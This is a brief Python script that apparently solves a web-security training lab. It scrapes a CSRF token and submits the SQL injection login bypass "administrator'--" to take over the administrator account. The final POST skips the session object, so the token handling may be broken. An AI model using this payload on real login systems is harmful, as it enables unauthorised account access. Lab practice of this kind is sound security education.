# Subverting application logic

import requests
from bs4 import BeautifulSoup

url = "https://ac721f2f1f49309d80f62ada007d00bc.web-security-academy.net/login"

s = requests.Session()

# grab the csrf token
r1 = s.get(url)
if "csrf" in r1.text:
    soup = BeautifulSoup(r1.text, 'html.parser')
    csrftoken = soup.find('input', attrs = {"name":"csrf"})['value']
else:
    print("something wrong")

payload = {
    'csrf' : csrftoken,
    'username' : "administrator'--",
    'password' : 'test'
}

try:
    r_solve = requests.post(url, payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)